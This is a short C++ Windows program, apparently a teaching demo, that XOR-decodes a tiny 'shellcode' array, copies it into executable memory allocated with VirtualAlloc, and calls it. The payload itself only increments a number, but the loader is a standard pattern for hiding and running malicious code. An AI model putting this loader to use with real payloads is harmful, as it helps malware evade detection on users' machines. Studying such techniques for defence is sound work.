#include <iostream>
#include <windows.h>
#include <stdio.h>
int main() {
	
	// Our malicious code
	//char malcode[] = { 0x89, 0xC8, 0x40, 0xC3 };
	char mal_obfuscated[] = {0xffffff11,0xffffff50,0xd8,0xffffff5b};  // The obfuscated shellcode
	char malcode[sizeof(mal_obfuscated)];  // The memory that will hold the deobfuscated code
	
	// A simple XOR Decryption that will change the obfuscated hexcode to our original malcious shellcode
	int p = 0;
	for (int i = 0; i < sizeof(malcode); i++) {
		p = 0x98 ^ mal_obfuscated[i];
		printf("The hexcode is %x \n",p);
		malcode[i] = p;
	}
	//malcode array should now contain the shellcode
	
	// The space that will contain the malicious code inorder to execute it
	void * pfunc = VirtualAlloc(NULL,4096,MEM_COMMIT,PAGE_EXECUTE_READWRITE);
	
	// Copying the malicious code from char to heap allocated memory
	memcpy(pfunc,(void *)malcode,sizeof(malcode));
	
	// Creating a function poitner of return type int and takes argument int
	int (*fn)(int) = (int (*)(int))pfunc;
	std::cout << fn(2);
	
	// Freeing the memory
	VirtualFree(pfunc,NULL,MEM_RELEASE);
	
}
